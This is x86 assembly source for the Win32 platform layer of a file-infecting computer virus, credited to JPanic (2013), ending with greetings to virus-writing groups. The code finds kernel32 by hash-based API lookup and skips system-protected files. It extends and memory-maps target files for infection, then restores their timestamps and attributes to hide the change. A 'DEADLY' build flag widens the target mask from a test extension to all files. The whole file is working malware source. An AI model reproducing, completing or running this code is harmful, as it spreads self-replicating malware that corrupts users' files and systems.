;= Win32 Virus Procedure Implementation (c) 2013 JPanic ===================
;
; Provides Virus Operating System specific routines for Win32.
;
; PUBLICS:
;	Win32_Init()
;	Win32_FindFirst()
;	Win32_FindNext()
;	Win32_FindClose()
;	Win32_OpenFile()
;	Win32_Close()
;	Win32_Exit()
;	Win32_DirSetup
;	Win32_Chdir
;
; Most arguments are passed implicitly through the heap.
;
;= Directive Warez ========================================================

	.486
	locals @@
	.model flat

include inc\win32.inc
include inc\short.inc
include inc\stack.inc
include inc\pe.inc
include inf-pe.ash
include vheap.ash
include	strhash32.ash


	_WIN32PROC_ASM	EQU 	TRUE

;= Code Warez =============================================================
        include codeseg.ash
;= Win32_Init =============================================================
; Outputs:
;	CF on error.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_Init
Win32_Init		PROC

			efp = 0
			mov     ebx,[ebp+(size stPUSHAD)+(size _VirusHeap)-7Fh]
			inc	ebx
	@@k32_search:	dec	ebx
			xor	bx,bx
			call	IsImagePE
			jne	@@k32_search
	@@found_PE:	mov	esi,[esi.peh_ExportDirectory.pedir_VA]
			lea	esi,[esi+ebx.peexp_NameCount]
			lodsd					;peexp_NameCount
			xchg	ecx,eax
			lodsd					;peexp_ProcListPtr
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwProcsVA = -efp
			lodsd					;peexp_NameListPtr
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwNamesVA = -efp
			lodsd					;peexp_OrdinalListPtr
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwOrdsVA = -efp
                        xor	edx,edx
			;mov	[vheap.dwEUID],edx
			push	edx
			efp = efp + 4
			dwProcsFound = -efp
                @@proc_loop:	push	ecx		; peexp_NameCount
				efp = efp + 4
				mov	esi,[esp+efp+dwNamesVA]
				mov	esi,[esi+edx*4]
				add	esi,ebx
				pusha
				efp = efp + (8 * 4)
				call	StringHash32
				call	@@getprocofs
				W32_IMP_LIST	<<strhash32_laz !&_impname!&>, <dd strhash32>>
		                @@getprocofs:
					pop	edi
					push	L K32ProcCount
					pop	ecx
					repne	scasd
                                        .if     zero?
						mov 	esi,[esp+efp+dwOrdsVA]
						movzx	esi,wo [esi+edx*2]
						shl	esi,2
                                                add	esi,[esp+efp+dwProcsVA]
						lodsd
						lea	esi,[ebx+eax]
						neg     ecx
						mov	dwo [Win32Heap.LastWin32ProcAddr+(ecx * 4)],esi
						inc	dwo [esp+efp+dwProcsFound]
                                        .endif
				popa
                                efp = efp - (8 * 4)
				inc	edx
				pop	ecx
				efp = efp - 4
			dec	ecx
			jnz	@@proc_loop
			cmp	dwo [esp+efp.dwProcsFound],K32ProcCount
			lea	esp,[esp+efp]
			purge efp
			jne	@@exit_cf
			db	68h,"sfc",0
			push	esp			; lpFileName
			call	[Win32Heap.dwLoadLibraryA]
			pop	ecx
			xchg	eax,ecx
			jecxz	@@nosfc
			call @@skipsfcname	; lpProcName
				db	"SfcIsFileProtected",0
			@@skipsfcname:
			push	ecx		; hModule
			call	[Win32Heap.dwGetProcAddress]
			xchg	eax,ecx
		@@nosfc:mov	[Win32Heap.dwSfcIsFileProtected],ecx
			push	L win32$bigbuf_size	; dwByes
			push	L 40h			; GPTR
			call	[Win32Heap.dwGlobalAlloc]
			mov	[vheap.dwBigBuf],eax
			xchg	eax,ecx
		@@exit_ecxz_cf$1:
			jecxz	@@exit_cf
		@@exit_nc:
			test	al,1
			org	$-1
		@@exit_cf:
			stc
		@@exit:	ret
Win32_Init		ENDP

;= Win32_Exit =============================================================
PUBLIC	Win32_Exit
Win32_Exit		PROC
			mov	ecx,[vheap.dwBigBuf]
			jecxz	@@no_free
				push	ecx	; hMem
				call	dwo [Win32Heap.dwGlobalFree]
		@@no_free:
			ret
Win32_Exit		ENDP

;= Win32_FindFirst ========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindFirst
Win32_FindFirst		PROC

			; FindFirstFileW
			lea	eax,[Win32Heap.WFF_Entry]		; lpFindFileData
			push	eax
			call	@@SkipMask				; lpFileName
			ifdef 	DEADLY
			 dd	'*'
			else
			 dw '*','.','c','l','t','2','0',0		; *.clt20 for testing
			endif
		@@SkipMask:
			call	dwo [Win32Heap.dwFindFirstFileW]	; - FindFirstFileA(..)			
			inc	eax					; INVALID_FILE_HANDLE ?
			jz	$ret_cf
			dec	eax
			mov	[vheap.dwFindHandle],eax
		$Win32_Find:	
			test	[Win32Heap.WFF_Entry.wff_FileAttributes],BAD_FILE_ATTRIBUTES
			jnz	Win32_FindNext
			lea	edi,[Win32Heap.WFF_Entry.wff_FileName]
			mov	esi,[vheap.dwBigBuf]
			push	L NULL			; lpFilePart			
			push	esi			; lpBuffer
			push	L MAX_PATH		; nBufferLength
			push	edi			; lpFileName
			call 	[Win32Heap.dwGetFullPathNameW]
			mov	ecx,[Win32Heap.dwSfcIsFileProtected]
			jecxz	@@nosfc
			push	esi			; lpBuffer
			push	L NULL			; RpcHandle
			call	ecx			; SfcIsFileProtected(...)
			test	eax,eax
			jnz	Win32_FindNext
		@@nosfc:push	L FILE_ATTRIBUTE_NORMAL	; dwFileAttributes			
			push	esi			; lpFileName
			call 	[Win32Heap.dwSetFileAttributesW]
			xchg	eax,ecx
			jecxz	Win32_FindNext
			xor	ecx,ecx
			.if	dwo [Win32Heap.WFF_Entry.wff_FileSizeHigh] == ecx
				mov		ecx,dwo [Win32Heap.WFF_Entry.wff_FileSizeLow]
			.endif
	$ret_nc:	test	al,1
			org	$-1
	$ret_cf:	stc
	$ret:		ret

Win32_FindFirst		ENDP

;= Win32_FindNext =========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindNext
Win32_FindNext		PROC

			lea	eax,[Win32Heap.WFF_Entry]
			push	eax				; lpFindFileData
			push	dwo [vheap.dwFindHandle]	; hFindFile
			call	dwo [Win32Heap.dwFindNextFileW]; - FindNextFileA(..)
			test	eax,eax
			jnz	$Win32_Find
			stc
			ret

Win32_FindNext		ENDP

;= Win32_FindClose ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindClose
Win32_FindClose		PROC			
			mov	ecx,[vheap.dwFindHandle]
			jecxz	@@ret
			push	ecx				; hFindFile
			call	dwo [Win32Heap.dwFindClose]	; - FindClose(..)
		@@ret:	ret
Win32_FindClose		ENDP

;= Win32_OpenFile =========================================================
;
; Outputs:
;	CF on error.
;	EAX = Mapped file on success.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_OpenFile
Win32_OpenFile		PROC

			xor	ecx,ecx
			; CreateFileA
			push	ecx				; hTemplateFile
			push	ecx                             ; dwFlagsAndAttributes
			push	L OPEN_EXISTING			; dwCreationDisposition
			push	ecx				; lpSecurityAttributes
			push	ecx 				; dwShareMode
			push	L (GENERIC_READ + GENERIC_WRITE); dwDesiredAccess
			push	[vheap.dwBigBuf]		; lpFIleName
			call	dwo [Win32Heap.dwCreateFileW]	; - CreateFileA(..)
			mov	[vheap.dwFileHandle],eax
			inc	eax				; INVALID_HANDLE_VALUE ?
			jz	$ret$c
			dec	eax
			xor	ebx,ebx
			mov	bh,20h
			mov	esi,[vheap.dwFileSize]
			add	esi,ebx
			; FileHandle ExtendedSize
			push	eax esi
			; SetFilePointer
			push	L FILE_END			; dwMoveMethod
			push	L NULL				; lpDistanceToMoveHigh
			push	ebx				; lDistanceToMove
			push	eax				; hFile
			call	dwo [Win32Heap.dwSetFilePointer]; - SetFilePointer(..)
			; ExtendedSize
			pop	ecx
			cmp	eax,ecx
			; FileHandle
			pop	eax
			jne	$restore_close
			; FileHandle, ExtendedSize
			push	eax ecx
			; SetEndOfFile
			push	eax				; hFile
			call	dwo [Win32Heap.dwSetEndOfFile]	; - SetEndOfFile(..)
			xchg	eax,ecx
			; ExtendedSize, FileHandle
			pop	edx ebx
			jecxz	$restore_close
			xor	eax,eax
			; CreateFileMappingW
			push	eax				; lpName
			push	eax				; dwMaximumSizeLow
			push	eax				; dwMaximumSizeHigh
			push	L PAGE_READWRITE		; flProtect
			push	eax				; lpFileMappingAttributes
			push	ebx				; hFile
			call	dwo [Win32Heap.dwCreateFileMappingW]; - CreateFileMappingA(..)
			mov	dwo [Win32Heap.dwMapHandle],eax
			xchg	eax,ecx
			jecxz	$restore_size
			xor	edx,edx
			; MapViewOfFile
			push	edx				; dwNumberOfBytesToMap
			push	edx				; dwFileOffsetLow
			push	edx 				; dwFileOffsetHigh
			push	L FILE_MAP_ALL_ACCESS		; dwDesiredAccess
			push	ecx				; hFileMappingObject
			call	dwo [Win32Heap.dwMapViewOfFile]; - MapViewOfFile(..)
			mov	[vheap.dwMappedFile],eax
			test	eax,eax
			jz	$restore_mapping_obj
			ret

Win32_OpenFile		ENDP

;= Win32_CloseFile ========================================================
;
; Outputs:
;	None. (returns CF as it is used by Win32_OpenFile on error).
;
;--------------------------------------------------------------------------
PUBLIC	Win32_CloseFile
Win32_CloseFile		PROC

			push	[vheap.dwMappedFile]		; lpBaseAddress
			call	dwo [Win32Heap.dwUnmapViewOfFile]; - UnmapViewOfFile(..)
	$restore_mapping_obj:
			push	dwo [Win32Heap.dwMapHandle]	; hObject
			call	dwo [Win32Heap.dwCloseHandle]	; - CloseHandle(..)
	$restore_size:	mov	edi,[vheap.dwFileHandle]
			push	edi				; File handle (used as hFile for next SetEndOfFile()).
			push	L FILE_BEGIN			; dwMoveMethod
			push	L NULL				; lpDistancetoMoveHigh
			push	[vheap.dwFileSize]		; lDistanceToMove
			push	edi				; hFile
			call	dwo [Win32Heap.dwSetFilePointer]; - SetFilePointer(..)
			call	dwo [Win32Heap.dwSetEndOfFile]	; - SetEndOfFile(..)
	$restore_close:
			lea	ecx,[Win32Heap.WFF_Entry.wff_wftLastWriteTime]
			push	ecx				; lpLastWriteTime
			sub	ecx,8
			push	ecx				; lpLastAccesTime
			sub	ecx,8
			push	ecx				; lpCreationTime
			push	edi				; hFile
			call	dwo [Win32Heap.dwSetFileTime]
			push	edi				; hFile
			call	dwo [Win32Heap.dwCloseHandle]	; - CloseHandle(..)
			push	dwo [Win32Heap.WFF_Entry.wff_FileAttributes]	; dwFileAttributes			
			push	[vheap.dwBigBuf]				; lpFileName
			call 	[Win32Heap.dwSetFileAttributesW]
	$ret$c:	        stc
			ret
Win32_CloseFile		ENDP

;= Win32_Chdir ============================================================
;
; ebx = szDir
; returns CF on error.
;
;--------------------------------------------------------------------------
PUBLIC Win32_Chdir
Win32_Chdir		PROC
			push	ebx	; lpPathName
			call	[Win32Heap.dwSetCurrentDirectoryW]
			cmp	eax,1	; CF on error.
			ret
Win32_Chdir		ENDP

;= Win32_DirSetup =========================================================
;
; Outputs:
;	dwCWD, dwDirA, dwDirB
;
;--------------------------------------------------------------------------
PUBLIC	Win32_DirSetup
Win32_DirSetup		PROC			
			;lea	edi,[vheap.dwDirCWD]		; edi: dest
			mov	esi,[vheap.dwBigBuf]
			mov	edx,MAX_PATH			; edx: Buffer TCHAR Count
			lea	ebx,[edx+edx]			; ebx: Buffer Size
			add	esi,ebx				; esi: Buffer			
			; GetCurrentDirectory
			push	edx
			push	esi
			push	edx
			call	[Win32Heap.dwGetCurrentDirectoryW]
			pop	edx
			call	DirReturnValue
			; GetWindowsDirectory			
			push	edx
			push	edx
			push	esi
			call	[Win32Heap.dwGetWindowsDirectoryW]
			pop	edx
			call	DirReturnValue
			; GetSystemDirectory
			push	edx
			push	edx
			push	esi
			call	[Win32Heap.dwGetSystemDirectoryW]
			pop	edx
			;call	DirReturnValue
			;ret
Win32_DirSetup		ENDP

DirReturnValue		PROC
			xor	ecx,ecx				; ecx: zero
			test	eax,eax
			jz	@@s1
			cmp	eax,edx
			mov	eax,ecx
			ja	@@s1
			mov	eax,esi
		@@s1:	stosd
			add	esi,ebx
			ret
DirReturnValue		ENDP

;--------------------------------------------------------------------------
PUBLIC txt1
txt1	dw	(ofs txt1e - txt1s)
txt1s:	db	"Greetz Go Out To: Immortal Riot/Genesis, "
	db	"NOP (lapse,vg and jp own you!), "
	db	"KDZ and the RuxCon regulars, "
	db	"The Feline Menace, "
	db	"And ofcourse The Lonely Grape.",0
txt1e:
		
;==========================================================================
                        ENDS
			END
;==========================================================================
